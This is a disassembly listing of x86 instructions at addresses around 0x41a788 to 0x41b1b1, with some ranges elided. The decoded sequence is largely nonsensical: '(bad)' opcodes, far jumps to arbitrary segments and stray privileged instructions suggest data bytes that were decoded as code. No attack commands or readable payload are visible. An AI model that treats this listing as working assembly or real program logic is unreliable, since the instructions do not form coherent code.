  41a788:	mov    ecx,0xd3b85785
  41a78d:	mov    ch,0xf7
  41a78f:	pop    esp
  41a790:	sbb    eax,0x6a9ad78c
  41a795:	add    DWORD PTR [esi+0x6126d070],ebp
  41a79b:	adc    esi,DWORD PTR [ebx-0x7d9cc2b6]
  41a7a1:	std    
  41a7a2:	out    dx,al
  41a7a3:	xchg   edx,eax
  41a7a4:	aad    0x25
  41a7a6:	adc    dh,ah
  41a7a8:	sbb    eax,0x4cf9c1e3
  41a7ad:	scas   al,BYTE PTR es:[edi]
  41a7ae:	aad    0xcc
  41a7b0:	addr16 jmp ebx
  41a7b3:	sbb    DWORD PTR [edx-0x90deff3],ecx
  41a7b9:	lock pop ds
  41a7bb:	xor    eax,0xc8edd68f
  41a7c0:	and    esp,0x6534b89c
  41a7c6:	addr16 mov al,ds:0xeb5d
  41a7ca:	sbb    eax,0xa511381f
  41a7cf:	jno    0x41a81f
  41a7d1:	loopne 0x41a7c7
  41a7d3:	cmp    al,bl
  41a7d5:	inc    esp
  41a7d6:	add    edx,DWORD PTR ds:0x84ef6c07
  41a7dc:	sahf   
  41a7dd:	ins    DWORD PTR es:[edi],dx
  41a7de:	out    0xd7,al
  41a7e0:	cmp    DWORD PTR [eax-0x20],0xf6c3ce8
  41a7e7:	je     0x41a7a8
  41a7e9:	jmp    0x0:0xff1ae8a1
	...
  41a854:	add    BYTE PTR [eax],al
  41a856:	repz xchg edi,eax
  41a858:	jae    0x41a7e1
  41a85a:	ja     0x41a843
  41a85c:	div    edi
  41a85e:	mov    ds:0x4f5327ca,al
  41a863:	test   BYTE PTR [esi-0x79],dh
  41a866:	addr16 sbb eax,0x1000001
  41a86c:	add    BYTE PTR [eax],al
  41a86e:	mov    edi,0x24dc8a26
  41a873:	jge    0x41a822
  41a875:	xor    al,bh
  41a877:	repnz xchg ebp,eax
  41a879:	inc    esi
  41a87a:	fcmove st,st(0)
  41a87c:	lods   eax,DWORD PTR fs:[esi]
  41a87e:	pop    es
  41a87f:	fdivr  QWORD PTR [esi+0x5382fcbb]
  41a885:	in     al,0x51
  41a887:	cmp    bl,al
  41a889:	dec    esp
  41a88a:	fstp   st(6)
  41a88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a88e:	sahf   
  41a88f:	mov    edx,0xfb6e3fba
  41a894:	out    0xa4,al
  41a896:	mov    bh,0xb
  41a898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a899:	call   0xaf5a:0x9d2ffa74
  41a8a0:	xchg   edx,esp
  41a8a2:	push   edx
  41a8a3:	and    cl,al
  41a8a5:	mov    es,WORD PTR [ebp-0x70ab5b4f]
  41a8ab:	pushf  
  41a8ac:	(bad)  
  41a8ad:	xchg   ecx,eax
  41a8ae:	je     0x41a8f8
  41a8b0:	inc    edi
  41a8b1:	aaa    
  41a8b2:	inc    esi
  41a8b3:	pop    eax
  41a8b4:	pusha  
  41a8b5:	sahf   
  41a8b6:	imul   esi,DWORD PTR [ebx+0x712be5e],0x5c
  41a8bd:	adc    ebx,edi
  41a8bf:	jmp    0x2509:0x91421a8a
  41a8c6:	cmp    bh,BYTE PTR [eax-0x36c44752]
  41a8cc:	mov    ecx,0x7d4866b1
  41a8d1:	mov    bh,0xdc
  41a8d3:	cdq    
  41a8d4:	fmul   DWORD PTR [ecx+0xfce0a23]
  41a8da:	lds    esp,FWORD PTR [esi]
  41a8dc:	sbb    DWORD PTR [eax+0x3ac7cf98],esi
  41a8e2:	sub    DWORD PTR [eax-0x717530e6],ebx
  41a8e8:	mov    edx,0x2695dd5c
  41a8ed:	sub    dl,BYTE PTR [ebp-0x7d0a5bea]
  41a8f3:	(bad)  
  41a8f4:	hlt    
  41a8f5:	add    eax,0x70af9593
  41a8fa:	mov    cl,0xab
  41a8fc:	fcom   DWORD PTR [ecx]
  41a8fe:	inc    ebp
  41a8ff:	jne    0x41a937
  41a901:	idiv   DWORD PTR [esi+eax*8-0x3d090d02]
  41a908:	iret   
  41a909:	jle    0x41a95f
  41a90b:	js     0x41a8eb
  41a90d:	in     al,0x9b
  41a90f:	popf   
  41a910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a911:	inc    ecx
  41a913:	aad    0x94
  41a915:	loope  0x41a8fd
  41a917:	mov    bh,0x0
  41a919:	and    esi,ecx
  41a91b:	test   eax,0xd1bdd6d7
  41a920:	adc    ebp,DWORD PTR [ebx-0x58]
  41a923:	test   al,0xa6
  41a925:	xchg   esi,eax
  41a926:	ror    DWORD PTR [esi+0x6a],0x71
  41a92a:	setnp  BYTE PTR [edi]
  41a92d:	ins    DWORD PTR es:[edi],dx
  41a92e:	xchg   edi,eax
  41a92f:	lods   eax,DWORD PTR ds:[esi]
  41a930:	loopne 0x41a951
  41a932:	stc    
  41a933:	lods   al,BYTE PTR ds:[esi]
  41a934:	and    al,0x7b
  41a936:	ret    0xa72
  41a939:	fadd   DWORD PTR [edx-0x2c600e1c]
  41a93f:	push   ecx
  41a940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a941:	shr    BYTE PTR [esi-0x2f],1
  41a944:	retf   
  41a945:	call   0x5200:0x5e99666e
  41a94c:	(bad)  
  41a94d:	adc    DWORD PTR [esi+0x391328b9],ebp
  41a953:	call   0x18ed:0x52b45c28
  41a95a:	hlt    
  41a95b:	ror    DWORD PTR [edx+ebp*8-0x61579ea0],cl
  41a962:	add    al,0x79
  41a964:	push   edx
  41a965:	(bad)  
  41a966:	pop    ds
  41a967:	in     eax,0x79
  41a969:	ins    DWORD PTR es:[edi],dx
  41a96a:	inc    edx
  41a96b:	fsub   DWORD PTR [ecx+0x16]
	...
  41a9d6:	xor    eax,0xcf4a867e
  41a9db:	cli    
  41a9dc:	std    
  41a9dd:	jg     0x41aa2d
  41a9df:	push   edx
  41a9e0:	pushf  
  41a9e1:	dec    esp
  41a9e2:	cs sbb ch,al
  41a9e5:	packuswb mm3,QWORD PTR [esi]
  41a9e8:	add    DWORD PTR [eax],eax
  41a9ea:	add    BYTE PTR [ecx],al
  41a9ec:	add    BYTE PTR [eax],al
  41a9ee:	push   0xffffffe3
  41a9f0:	lods   eax,DWORD PTR gs:[esi]
  41a9f2:	icebp  
  41a9f3:	mov    al,BYTE PTR [ecx]
  41a9f5:	push   ss
  41a9f6:	jae    0x41a9b7
  41a9f8:	sbb    DWORD PTR ds:0xa5e2ced6,ebx
  41a9fe:	adc    DWORD PTR [eax-0x8],eax
  41aa01:	xor    al,dh
  41aa03:	dec    esp
  41aa04:	and    al,0x9b
  41aa06:	lods   al,BYTE PTR ds:[esi]
  41aa07:	push   ecx
  41aa08:	cmp    al,0xff
  41aa0a:	adc    eax,esp
  41aa0c:	inc    esi
  41aa0d:	lahf   
  41aa0e:	dec    edi
  41aa0f:	sub    BYTE PTR [edi+0x4e1b1cad],ch
  41aa15:	push   edx
  41aa16:	and    edi,DWORD PTR [eax+0x6c]
  41aa19:	icebp  
  41aa1a:	loop   0x41aa9a
  41aa1c:	lea    esi,[edx+0x8e64601]
  41aa22:	push   ebp
  41aa23:	sub    eax,0x5e24fe39
  41aa28:	aam    0xf8
  41aa2a:	sub    ecx,DWORD PTR [edi-0x7c]
  41aa2d:	push   ebp
  41aa2e:	or     al,0x67
  41aa30:	adc    bl,dh
  41aa32:	pop    ds
  41aa33:	mov    WORD PTR ds:0x24f38728,cs
  41aa39:	retf   0x652f
  41aa3c:	and    dl,BYTE PTR [esi+0xc]
  41aa3f:	adc    eax,0x99dd9852
  41aa44:	sub    BYTE PTR [edx+edi*8-0x37e357e2],cl
  41aa4b:	daa    
  41aa4c:	daa    
  41aa4d:	icebp  
  41aa4e:	xchg   BYTE PTR [ebp+0xd86aa5c],ch
  41aa54:	outs   dx,BYTE PTR ds:[esi]
  41aa55:	mov    ch,bl
  41aa57:	fidivr WORD PTR [edi+0x15]
  41aa5a:	adc    BYTE PTR ds:0xd1bca9eb,ah
  41aa60:	(bad)  
  41aa61:	enter  0xea1e,0xfc
  41aa65:	push   eax
  41aa66:	in     eax,0xfe
  41aa68:	push   esp
  41aa69:	aas    
  41aa6a:	dec    eax
  41aa6b:	cmp    BYTE PTR [edi-0x4797cf9],ah
  41aa71:	add    al,0xb8
  41aa73:	nop
  41aa74:	mov    bh,dl
  41aa76:	int    0x42
  41aa78:	push   es
  41aa79:	jge    0x41aa37
  41aa7b:	dec    edx
  41aa7c:	mov    edx,0x23c43915
  41aa81:	leave  
  41aa82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa83:	push   ebx
  41aa84:	or     al,0x85
  41aa86:	mov    dl,BYTE PTR [ecx-0x4fbceb72]
  41aa8c:	cmp    ebp,DWORD PTR [esi-0x43e18de5]
  41aa92:	add    bh,BYTE PTR [esi]
  41aa94:	rcl    DWORD PTR [ebp+0x51],0xa9
  41aa98:	or     ch,cl
  41aa9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa9c:	and    BYTE PTR [edx+edi*8+0x48f362c2],bh
  41aaa3:	call   DWORD PTR [ecx+ebx*2+0x7e19063f]
  41aaaa:	inc    ebp
  41aaab:	mov    al,cl
  41aaad:	mov    al,ds:0x3571ee59
  41aab2:	scas   eax,DWORD PTR es:[edi]
  41aab3:	nop
  41aab4:	cmc    
  41aab5:	adc    DWORD PTR [ebx+0x10],ebx
  41aab8:	cmp    edx,edx
  41aaba:	sub    BYTE PTR [esi-0x1b],dh
  41aabd:	(bad)  
  41aabe:	fmul   QWORD PTR [ebp+0x303faa8a]
  41aac4:	jbe    0x41aaf8
  41aac6:	pop    bp
  41aac8:	inc    esp
  41aac9:	or     DWORD PTR [esi],ebp
  41aacb:	outs   dx,BYTE PTR cs:[esi]
  41aacd:	lea    ebp,[ebp-0x1e]
  41aad0:	sub    dh,BYTE PTR [eax]
  41aad2:	scas   al,BYTE PTR es:[edi]
  41aad3:	imul   ebx,DWORD PTR [eax-0x4c1ca3e5],0xe3486e31
  41aadd:	popf   
  41aade:	psubsb mm0,QWORD PTR [eax+0x5514b04d]
  41aae5:	stos   BYTE PTR es:[edi],al
  41aae6:	jbe    0x41ab49
  41aae8:	xchg   edi,eax
  41aae9:	arpl   WORD PTR [edx-0x7f],ax
  41aaec:	sub    eax,edx
	...
  41ab56:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	les    esi,FWORD PTR [ecx]
  41ab64:	or     eax,0x11f67b5
  41ab69:	add    BYTE PTR [eax],al
  41ab6b:	add    DWORD PTR [eax],eax
  41ab6d:	add    ah,dh
  41ab6f:	addr16 mov dh,0x43
  41ab72:	cmp    BYTE PTR [edx-0x63],0x7c
  41ab76:	lods   eax,DWORD PTR ds:[esi]
  41ab77:	pop    ebx
  41ab78:	mov    dl,0x9c
  41ab7a:	push   0xffffffe9
  41ab7c:	in     eax,0xfc
  41ab7e:	fcom   DWORD PTR [edi+0x343d1f1b]
  41ab84:	add    edi,DWORD PTR [esi-0x12]
  41ab87:	jecxz  0x41ab3d
  41ab89:	es xor al,0x1f
  41ab8c:	test   al,0xb4
  41ab8e:	repz xor BYTE PTR [ebp-0x2d8693d2],ch
  41ab95:	mov    ds:0xb6ba0778,eax
  41ab9a:	aas    
  41ab9b:	aam    0xa2
  41ab9d:	(bad)  
  41ab9e:	hlt    
  41ab9f:	sahf   
  41aba0:	fidivr WORD PTR [esi]
  41aba2:	aad    0x14
  41aba4:	mov    dl,0xab
  41aba6:	out    0x39,eax
  41aba8:	mov    gs,WORD PTR [ebp+0x6b]
  41abab:	jbe    0x41ac10
  41abad:	pop    ecx
  41abae:	cmp    al,0x3f
  41abb0:	scas   al,BYTE PTR es:[edi]
  41abb1:	jne    0x41ac30
  41abb3:	jno    0x41abd3
  41abb5:	mov    edi,0x48f14951
  41abba:	xchg   esp,eax
  41abbb:	aad    0x72
  41abbd:	jge    0x41ab98
  41abbf:	or     edx,0x90c1e5ac
  41abc5:	xchg   ebp,eax
  41abc6:	hlt    
  41abc7:	aam    0xdf
  41abc9:	test   BYTE PTR [ebx+0x27],dh
  41abcc:	inc    ebp
  41abcd:	mov    edx,0xcc0b8f34
  41abd2:	or     eax,0xe7f90b3e
  41abd7:	mov    ds:0xc236afdf,eax
  41abdc:	stc    
  41abdd:	lahf   
  41abde:	adc    BYTE PTR [edi+0x51],0x79
  41abe2:	loopne 0x41ac44
  41abe4:	sub    bh,BYTE PTR [edx-0x7e]
  41abe7:	outs   dx,DWORD PTR ds:[esi]
  41abe8:	xor    cl,BYTE PTR [esi-0x4e79b703]
  41abee:	aad    0xa3
  41abf0:	test   ecx,ebp
  41abf2:	mov    eax,0x7f7f4a00
  41abf7:	push   ecx
  41abf8:	popa   
  41abf9:	cld    
  41abfa:	push   eax
  41abfb:	dec    edi
  41abfc:	fdivr  QWORD PTR [edi-0x56097375]
  41ac02:	shl    BYTE PTR [eax],cl
  41ac04:	xor    bh,bh
  41ac06:	fucom  st(7)
  41ac08:	push   ecx
  41ac09:	rcr    BYTE PTR [eax+0x1f],cl
  41ac0c:	or     al,0x71
  41ac0e:	and    DWORD PTR [eax],edx
  41ac10:	dec    eax
  41ac11:	test   DWORD PTR [ebx-0x9be8459],edi
  41ac17:	or     esp,DWORD PTR [ebx]
  41ac19:	call   DWORD PTR [eax+0x7f]
  41ac1c:	inc    esi
  41ac1d:	outs   dx,DWORD PTR ds:[esi]
  41ac1e:	cld    
  41ac1f:	out    0x57,al
  41ac21:	push   0x83124754
  41ac26:	(bad)  
  41ac27:	xor    al,BYTE PTR [edi]
  41ac29:	push   eax
  41ac2a:	stos   BYTE PTR es:[edi],al
  41ac2b:	cmp    BYTE PTR [ecx+0x4853a0ff],al
  41ac31:	pop    edx
  41ac32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac33:	pop    eax
  41ac34:	adc    esp,ebx
  41ac36:	push   edx
  41ac37:	inc    esp
  41ac38:	pop    es
  41ac39:	mov    dh,0x9
  41ac3b:	jb     0x41ac1f
  41ac3d:	rcr    DWORD PTR [ebx+edx*8-0x3227ec7d],1
  41ac44:	test   BYTE PTR [ebp-0x66],ch
  41ac47:	push   ebp
  41ac48:	lock fwait
  41ac4a:	scas   al,BYTE PTR es:[edi]
  41ac4b:	fistp  QWORD PTR [esi-0x7d4d55b7]
  41ac51:	mov    ecx,0xdbe6c19e
  41ac56:	das    
  41ac57:	xor    al,cl
  41ac59:	mov    ds:0xfe3eb849,eax
  41ac5e:	inc    ecx
  41ac5f:	jmp    0x9953:0xd11bf6b7
  41ac66:	daa    
  41ac67:	mov    dl,0x2
  41ac69:	xchg   edx,eax
  41ac6a:	repnz inc ebx
  41ac6c:	xchg   esi,eax
  41ac6d:	arpl   WORD PTR [eax],ax
	...
  41acd3:	add    BYTE PTR [eax],al
  41acd5:	add    BYTE PTR [edx+0x49],ch
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [edi+esi*2-0xa]
  41ace4:	mov    bl,0xa0
  41ace6:	and    BYTE PTR [bx+di],al
  41ace9:	add    BYTE PTR [eax],al
  41aceb:	add    DWORD PTR [eax],eax
  41aced:	add    BYTE PTR [ecx-0x4a],cl
  41acf0:	or     DWORD PTR [ecx],ebx
  41acf2:	pop    ebp
  41acf3:	pusha  
  41acf4:	mov    ebp,0x8ebb7e0d
  41acf9:	xchg   DWORD PTR [eax+0x461c6560],ecx
  41acff:	aaa    
  41ad00:	lods   eax,DWORD PTR ds:[esi]
  41ad01:	dec    BYTE PTR [ebp-0x6cad7ae9]
  41ad07:	push   cs
  41ad08:	sbb    edi,DWORD PTR [edi-0x1782d04f]
  41ad0e:	cmp    eax,0xd4ed4b7a
  41ad13:	imul   ebx,DWORD PTR [eax-0x1109f5d7],0x79701ce0
  41ad1d:	xlat   BYTE PTR ds:[ebx]
  41ad1e:	sahf   
  41ad1f:	dec    edi
  41ad20:	ds in  eax,dx
  41ad22:	scas   eax,DWORD PTR es:[edi]
  41ad23:	mov    DWORD PTR [ebx+0x4ffa78c0],ebx
  41ad29:	mov    cl,0xfb
  41ad2b:	mov    eax,0xbcd3ada9
  41ad30:	jl     0x41acf1
  41ad32:	xchg   DWORD PTR [eax+0x25],ecx
  41ad35:	xor    eax,ecx
  41ad37:	mov    ebx,0xbabf3ab9
  41ad3c:	aaa    
  41ad3d:	or     ecx,DWORD PTR [ebx]
  41ad3f:	int    0x73
  41ad41:	call   0x3254:0x9f5c4b6f
  41ad48:	adc    cl,BYTE PTR [esi+ebp*2-0x72e314d6]
  41ad4f:	jb     0x41acf9
  41ad51:	cmp    eax,0x21d941f0
  41ad56:	cmp    eax,0x90edd36f
  41ad5b:	pop    esp
  41ad5c:	sub    eax,0xa4445435
  41ad61:	add    DWORD PTR [edx-0x3b8add1d],edx
  41ad67:	out    0x11,al
  41ad69:	pop    eax
  41ad6a:	jl     0x41adce
  41ad6c:	(bad)  
  41ad6d:	into   
  41ad6e:	fiadd  WORD PTR [ecx-0x74]
  41ad71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad72:	pop    edx
  41ad73:	jle    0x41add2
  41ad75:	or     al,0x1d
  41ad77:	lahf   
  41ad78:	xchg   esi,eax
  41ad79:	mov    al,0xa
  41ad7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad7c:	fidivr WORD PTR [edx-0x23]
  41ad7f:	mov    ds:0x72a2bcaa,al
  41ad84:	xlat   BYTE PTR ds:[ebx]
  41ad85:	dec    edi
  41ad86:	cmp    edi,DWORD PTR [eax-0x656a7fe1]
  41ad8c:	nop
  41ad8d:	lahf   
  41ad8e:	push   edi
  41ad8f:	mov    cl,0xa6
  41ad91:	(bad)  
  41ad92:	rcl    DWORD PTR [ebp-0x7faaa814],cl
  41ad98:	xchg   esp,eax
  41ad99:	xor    DWORD PTR [esi],0xfffffff5
  41ad9c:	push   ss
  41ad9d:	or     ebp,DWORD PTR [eax]
  41ad9f:	mov    eax,ds:0x27cf152c
  41ada4:	js     0x41adec
  41ada6:	mov    BYTE PTR [edx],bl
  41ada8:	mov    dl,0xc4
  41adaa:	or     ecx,DWORD PTR [ecx]
  41adac:	and    ebx,ebx
  41adae:	test   eax,0x2084be4
  41adb3:	cmc    
  41adb4:	and    ecx,DWORD PTR [edx]
  41adb6:	jp     0x41adbf
  41adb8:	sub    ch,al
  41adba:	jb     0x41ad59
  41adbc:	call   0x7d8f1368
  41adc1:	dec    ebp
  41adc2:	loope  0x41ad60
  41adc4:	jp     0x41ae35
  41adc6:	pop    ebx
  41adc7:	mov    eax,ds:0x83463467
  41adcc:	push   ss
  41adcd:	push   ds
  41adce:	sub    dh,BYTE PTR [ebp-0x7f]
  41add1:	push   edx
  41add2:	repnz dec ecx
  41add4:	pop    ecx
  41add5:	jbe    0x41ad65
  41add7:	loope  0x41ad74
  41add9:	repnz shl DWORD PTR [ebx],cl
  41addc:	int    0x4d
  41adde:	cmp    eax,0x1b6c5bf3
  41ade3:	mov    ch,0x12
  41ade5:	mov    al,ds:0x9282a803
  41adea:	rcr    esp,cl
  41adec:	push   esi
  41aded:	pusha  
	...
  41ae56:	push   ebp
  41ae57:	clc    
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [ebx+edi*1+0x67a9f35c],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    ah,dl
  41ae6f:	pop    esp
  41ae70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae71:	mov    eax,ds:0xdbd222eb
  41ae76:	or     al,0x7a
  41ae78:	or     al,0x48
  41ae7a:	push   0xffffffc4
  41ae7c:	div    DWORD PTR [ecx+0x123eea5a]
  41ae82:	js     0x41ae23
  41ae84:	into   
  41ae85:	dec    esi
  41ae86:	jge    0x41ae52
  41ae88:	sub    BYTE PTR [ebx-0x5a],dl
  41ae8b:	sub    al,0x3a
  41ae8d:	shl    DWORD PTR [ecx-0x3f],0xb2
  41ae91:	daa    
  41ae92:	push   es
  41ae93:	in     al,dx
  41ae94:	sub    al,BYTE PTR [ecx+0x4a]
  41ae97:	test   al,0x23
  41ae99:	dec    ebp
  41ae9a:	stos   DWORD PTR es:[edi],eax
  41ae9b:	stc    
  41ae9c:	popa   
  41ae9d:	js     0x41ae4a
  41ae9f:	div    DWORD PTR [ecx+0x4b]
  41aea2:	fs mov ax,0xd5f9
  41aea7:	jp     0x41aefb
  41aea9:	add    DWORD PTR [ecx-0x4af9538d],eax
  41aeaf:	arpl   ax,bx
  41aeb1:	adc    dl,BYTE PTR [ebx+0x214e4650]
  41aeb7:	(bad)  
  41aeb8:	frstor [esi+0x24b83935]
  41aebe:	cld    
  41aebf:	fld    QWORD PTR [ebx+0x485b1159]
  41aec5:	jns    0x41aecf
  41aec7:	add    ah,BYTE PTR [ecx+0x6a021617]
  41aecd:	imul   eax,ebx,0x1a
  41aed0:	sub    eax,0x5737e6c5
  41aed5:	stos   DWORD PTR es:[edi],eax
  41aed6:	jge    0x41aec7
  41aed8:	int3   
  41aed9:	jb     0x41af4c
  41aedb:	(bad)  
  41aedc:	sbb    eax,0x64ab9a4f
  41aee1:	pop    ds
  41aee2:	leave  
  41aee3:	jnp    0x41af49
  41aee5:	sub    ch,dl
  41aee7:	pop    ss
  41aee8:	fidivr DWORD PTR [edi]
  41aeea:	ins    BYTE PTR es:[edi],dx
  41aeeb:	outs   dx,BYTE PTR ds:[esi]
  41aeec:	mov    eax,0xb62cdf89
  41aef1:	xor    bh,dh
  41aef3:	adc    BYTE PTR [esi],ch
  41aef5:	xchg   BYTE PTR cs:[ebx+0x63],dh
  41aef9:	loop   0x41aeab
  41aefb:	add    ecx,DWORD PTR [edi+0x6f]
  41aefe:	call   0x15d8:0x725e1972
  41af05:	clc    
  41af06:	xor    DWORD PTR [eax],ebp
  41af08:	xor    al,0x5f
  41af0a:	pop    ebx
  41af0b:	jo     0x41aeeb
  41af0d:	data16 jle 0x41af35
  41af10:	loope  0x41aea5
  41af12:	outs   dx,DWORD PTR ds:[esi]
  41af13:	setnp  BYTE PTR [eax-0x56]
  41af17:	lea    edi,[eax+0x57]
  41af1a:	cmp    al,0xcd
  41af1c:	mov    bh,cl
  41af1e:	shl    ah,cl
  41af20:	add    DWORD PTR [esi+edi*2-0x53],0x900070cc
  41af28:	adc    ah,BYTE PTR [ebx-0x1dda29d2]
  41af2e:	xchg   ecx,eax
  41af2f:	xor    dh,BYTE PTR [ecx-0x2f]
  41af32:	std    
  41af33:	mov    cl,0x83
  41af35:	inc    ebx
  41af36:	jmp    0x9d14ab74
  41af3b:	(bad)  
  41af3c:	call   0xd4a46f4b
  41af41:	enter  0x7afd,0x9b
  41af45:	and    bl,bl
  41af47:	test   eax,0x6cd01d
  41af4c:	ror    BYTE PTR [edi-0x14],cl
  41af4f:	jb     0x41af4b
  41af51:	into   
  41af52:	inc    edx
  41af53:	xor    eax,0xe25921e8
  41af58:	sub    BYTE PTR [ebp+0x3df05cb8],ah
  41af5e:	add    DWORD PTR [ecx],edx
  41af60:	ss sub al,0x9f
  41af63:	inc    ecx
  41af64:	(bad)  
  41af65:	mov    dl,0x7
  41af67:	mov    eax,ds:0x3bed86ba
  41af6c:	sub    edx,edi
	...
  41afd6:	(bad)  
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0x7fda44ee
  41afe4:	ins    BYTE PTR es:[edi],dx
  41afe5:	mov    ds:0x12267,eax
  41afea:	add    BYTE PTR [ecx],al
  41afec:	add    BYTE PTR [eax],al
  41afee:	stos   BYTE PTR es:[edi],al
  41afef:	jl     0x41afb9
  41aff1:	jecxz  0x41b020
  41aff3:	imul   edx,DWORD PTR [eax-0x1e],0x8b676305
  41affa:	nop
  41affb:	xchg   DWORD PTR ds:[edx-0x18306f65],eax
  41b002:	xlat   BYTE PTR ds:[ebx]
  41b003:	cmp    al,0x28
  41b005:	dec    esp
  41b006:	or     bl,dl
  41b008:	jne    0x41b081
  41b00a:	nop
  41b00b:	int    0xd2
  41b00d:	pushf  
  41b00e:	inc    edi
  41b00f:	fld    DWORD PTR [ecx]
  41b011:	add    dl,BYTE PTR [ebx+0x38]
  41b014:	push   esp
  41b015:	push   esi
  41b016:	pop    edi
  41b017:	jno    0x41afd3
  41b019:	cli    
  41b01a:	outs   dx,DWORD PTR ds:[esi]
  41b01b:	push   eax
  41b01c:	lds    edx,FWORD PTR [eax]
  41b01e:	jl     0x41afba
  41b020:	jle    0x41b06b
  41b022:	imul   edx,DWORD PTR [esi+0xedc937a],0x75
  41b029:	pop    ss
  41b02a:	cmp    ecx,DWORD PTR [ebp+0x5a2a071]
  41b030:	(bad)  
  41b031:	into   
  41b032:	mov    cl,0xbf
  41b034:	int    0xe0
  41b036:	inc    edi
  41b037:	sbb    dl,BYTE PTR [edi-0x67]
  41b03a:	js     0x41b06d
  41b03c:	xchg   esi,eax
  41b03d:	mov    DWORD PTR [eax+0x4e],esp
  41b040:	mov    ebp,esp
  41b042:	xor    eax,0x7a47b8c5
  41b047:	inc    esi
  41b048:	add    DWORD PTR [ebx-0x240c23c4],ebp
  41b04e:	into   
  41b04f:	daa    
  41b050:	jbe    0x41b033
  41b052:	add    DWORD PTR [edx-0x282b7825],esp
  41b058:	jne    0x41b091
  41b05a:	mov    esp,0x1d72fa4e
  41b05f:	sbb    al,0x83
  41b061:	xchg   BYTE PTR [edi-0x1f825fa2],bh
  41b067:	dec    ebp
  41b068:	iret   
  41b069:	jns    0x41b044
  41b06b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b06c:	sub    BYTE PTR [edi-0x4dc30f5e],dh
  41b072:	data16 test al,0x2c
  41b075:	inc    ecx
  41b076:	push   ds
  41b077:	cmp    bh,BYTE PTR [edi+eiz*1+0x32]
  41b07b:	in     eax,0xff
  41b07d:	add    al,0xd9
  41b07f:	loopne 0x41b0b3
  41b081:	cmp    eax,0x1264bfb7
  41b086:	push   ecx
  41b087:	push   ecx
  41b088:	repnz adc al,0x62
  41b08b:	pop    es
  41b08c:	popa   
  41b08d:	jle    0x41b01d
  41b08f:	int    0xe7
  41b091:	pop    edi
  41b092:	mov    eax,0x82ffcb37
  41b097:	(bad)  
  41b098:	fwait
  41b099:	cs inc ebp
  41b09b:	ror    eax,0xf3
  41b09e:	sub    BYTE PTR [ebp+ecx*1-0x65],al
  41b0a2:	aaa    
  41b0a3:	dec    edx
  41b0a4:	push   DWORD PTR [eax]
  41b0a6:	(bad)  
  41b0a7:	fstp   QWORD PTR [ebx]
  41b0a9:	in     al,0xdb
  41b0ab:	adc    eax,0x4d93b839
  41b0b0:	scas   eax,DWORD PTR es:[edi]
  41b0b1:	ror    DWORD PTR [eax],0x4a
  41b0b4:	mov    dh,BYTE PTR [ebx+0x34aceb73]
  41b0ba:	int3   
  41b0bb:	and    cl,cl
  41b0bd:	repnz cli 
  41b0bf:	aaa    
  41b0c0:	ja     0x41b102
  41b0c2:	push   esp
  41b0c3:	push   0x7a
  41b0c5:	out    dx,eax
  41b0c6:	sub    eax,0xdc37c9b8
  41b0cb:	sbb    edx,ebx
  41b0cd:	stos   BYTE PTR es:[edi],al
  41b0ce:	popa   
  41b0cf:	jl     0x41b0c7
  41b0d1:	fist   WORD PTR [edx-0x202a2b35]
  41b0d7:	pop    ds
  41b0d8:	push   es
  41b0d9:	lods   eax,DWORD PTR ds:[esi]
  41b0da:	push   ss
  41b0db:	lods   eax,DWORD PTR ds:[esi]
  41b0dc:	xchg   edx,eax
  41b0dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0de:	push   ebx
  41b0df:	in     al,dx
  41b0e0:	mov    al,ds:0xa8f20354
  41b0e5:	xchg   edi,eax
  41b0e6:	mov    esi,0x12b528a5
  41b0eb:	push   esi
  41b0ec:	dec    eax
  41b0ed:	call   0x41b0f2
	...
  41b156:	(bad)  
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x684ad8b3
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    BYTE PTR [edx+eiz*8-0x29],al
  41b171:	neg    DWORD PTR [ecx]
  41b173:	jmp    0x2f8cdc0c
  41b178:	into   
  41b179:	push   edi
  41b17a:	(bad)  
  41b17c:	rol    DWORD PTR [esi],cl
  41b17e:	fwait
  41b17f:	mov    eax,ds:0x5a8d309b
  41b184:	jmp    0x95e6c762
  41b189:	cmp    eax,0xf1094f52
  41b18e:	fisttp WORD PTR [ecx-0x490d7630]
  41b194:	cdq    
  41b195:	das    
  41b196:	push   edi
  41b197:	dec    esi
  41b198:	add    al,0x4d
  41b19a:	xor    eax,0x8aced22e
  41b19f:	and    dh,BYTE PTR [ecx]
  41b1a1:	in     al,dx
  41b1a2:	xchg   BYTE PTR [ebx],ch
  41b1a4:	cdq    
  41b1a5:	sub    al,0x98
  41b1a7:	mov    bh,0xe1
  41b1a9:	(bad)  
  41b1aa:	icebp  
  41b1ab:	stc    
  41b1ac:	mov    edi,0x5b14f0a0
  41b1b1:	mov    cl,0xfd
